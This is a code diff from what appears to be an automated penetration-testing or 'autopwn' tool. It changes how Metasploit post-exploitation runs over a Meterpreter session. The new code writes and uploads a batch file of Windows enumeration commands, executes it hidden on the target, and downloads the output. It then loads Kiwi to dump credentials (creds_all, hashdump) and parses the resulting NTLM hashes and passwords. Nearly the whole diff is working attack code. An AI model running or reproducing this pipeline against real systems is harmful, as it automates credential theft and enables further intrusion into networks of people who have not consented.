@@ -192,39 +192,60 @@ def _run_secretsdump(host: str, username: str, password: str, domain: str) -> li
 # Meterpreter RC script execution (for hosts with active meterpreter sessions)
 # ---------------------------------------------------------------------------
 
-def _build_meterpreter_rc(host: str, session_id: int) -> str:
+def _build_meterpreter_rc(host: str, session_id: int) -> tuple[str, str]:
     """
-    Generate a Metasploit resource script that:
-      1. Selects the active session
-      2. Runs all Windows enumeration commands via 'shell'
-      3. Loads Kiwi and dumps all credentials
-      4. Runs hashdump
+    Generate a Metasploit resource script and a companion .bat file for
+    post-exploitation enumeration via a Meterpreter session.
+
+    Returns (rc_content, bat_path) where bat_path is the local path to the
+    batch file that must exist on disk when msfconsole runs.
     """
-    shell_cmds = "\n".join(
-        f'sessions -i {session_id} -c "shell -c \\"{cmd}\\""'
-        for cmd in WINDOWS_COMMANDS
-    )
-    rc = textwrap.dedent(f"""\
+    safe_host = host.replace(".", "_")
+    bat_path    = f"/tmp/autopwn_postex_{safe_host}.bat"
+    remote_bat  = "C:\\\\Windows\\\\Temp\\\\autopwn_enum.bat"
+    remote_out  = "C:\\\\Windows\\\\Temp\\\\autopwn_enum.txt"
+    local_out   = f"/tmp/autopwn_postex_output_{safe_host}.txt"
+
+    # Build the batch file with all enumeration commands
+    bat_lines = ["@echo off"]
+    for cmd in WINDOWS_COMMANDS:
+        # Delimiter line so we can parse which command produced which output
+        bat_lines.append(f"echo ====AUTOPWN_CMD: {cmd}====")
+        bat_lines.append(cmd)
+        bat_lines.append("echo.")
+    bat_lines.append("echo ====AUTOPWN_DONE====")
+    pathlib.Path(bat_path).write_text("\r\n".join(bat_lines), encoding="utf-8")
+
+    # Build the RC script — no nested quoting, just upload/execute/download
+    rc_content = textwrap.dedent(f"""\
         sessions -i {session_id}
-        {shell_cmds}
-        sessions -i {session_id} -c "load kiwi"
-        sessions -i {session_id} -c "creds_all"
-        sessions -i {session_id} -c "hashdump"
+        upload {bat_path} {remote_bat}
+        execute -f cmd.exe -a "/c {remote_bat} > {remote_out} 2>&1" -H
+        sleep 15
+        download {remote_out} {local_out}
+        load kiwi
+        creds_all
+        hashdump
         exit
     """)
-    return rc
+    return rc_content, bat_path
 
 
 def _run_meterpreter_postex(host: str, session_id: int) -> tuple[list[dict], list[dict]]:
     """
     Execute post-ex commands via a Meterpreter session using an RC script.
+    Uploads a .bat file with all enumeration commands, executes it, and
+    downloads the output.  Also loads Kiwi for credential dumping.
     Returns (commands_run_list, credentials_found_list).
     """
-    rc_content = _build_meterpreter_rc(host, session_id)
-    rc_path = pathlib.Path(f"/tmp/autopwn_postex_{host.replace('.', '_')}.rc")
+    rc_content, bat_path = _build_meterpreter_rc(host, session_id)
+    safe_host = host.replace(".", "_")
+    rc_path   = pathlib.Path(f"/tmp/autopwn_postex_{safe_host}.rc")
+    local_out = f"/tmp/autopwn_postex_output_{safe_host}.txt"
     rc_path.write_text(rc_content)
 
     print(f"[postex]   Running Meterpreter post-ex RC for session {session_id} on {host}...")
+    msf_output = ""
     try:
         result = subprocess.run(
             ["msfconsole", "-q", "-r", str(rc_path)],
@@ -232,7 +253,7 @@ def _run_meterpreter_postex(host: str, session_id: int) -> tuple[list[dict], lis
             text=True,
             timeout=MSF_TIMEOUT,
         )
-        output = result.stdout + result.stderr
+        msf_output = result.stdout + result.stderr
     except FileNotFoundError:
         print("[postex]   msfconsole not found; skipping Meterpreter post-ex.")
         return [], []
@@ -241,15 +262,40 @@ def _run_meterpreter_postex(host: str, session_id: int) -> tuple[list[dict], lis
         return [], []
     finally:
         rc_path.unlink(missing_ok=True)
+        try:
+            os.unlink(bat_path)
+        except OSError:
+            pass
 
-    # Parse credential output from kiwi and hashdump
-    creds_found = _parse_ntlm_hashes(output) + _parse_kiwi_output(output)
+    # Parse credential output from kiwi and hashdump in MSF stdout
+    creds_found = _parse_ntlm_hashes(msf_output) + _parse_kiwi_output(msf_output)
 
-    # Build a single commands_run entry with the full MSF output
-    commands_run = [{
-        "command": "msfconsole post-ex RC (whoami/ipconfig/kiwi/hashdump)",
-        "output": output[:8000],  # cap at 8 KB to keep JSON manageable
-    }]
+    # Parse the downloaded command output file (if it was retrieved)
+    commands_run: list[dict] = []
+    output_path = pathlib.Path(local_out)
+    if output_path.exists():
+        raw = output_path.read_text(encoding="utf-8", errors="replace")
+        # Split on our delimiter lines
+        sections = re.split(r"====AUTOPWN_CMD: (.+?)====", raw)
+        # sections alternates: [preamble, cmd1, output1, cmd2, output2, ...]
+        i = 1
+        while i < len(sections) - 1:
+            cmd_name   = sections[i].strip()
+            cmd_output = sections[i + 1].strip()
+            # Remove trailing ====AUTOPWN_DONE==== from last section
+            cmd_output = cmd_output.replace("====AUTOPWN_DONE====", "").strip()
+            commands_run.append({"command": cmd_name, "output": cmd_output})
+            i += 2
+        try:
+            output_path.unlink()
+        except OSError:
+            pass
+    else:
+        # Download failed — fall back to raw MSF output
+        commands_run = [{
+            "command": "msfconsole post-ex RC (bat upload + kiwi + hashdump)",
+            "output": msf_output[:8000],
+        }]
 
     return commands_run, creds_found
 
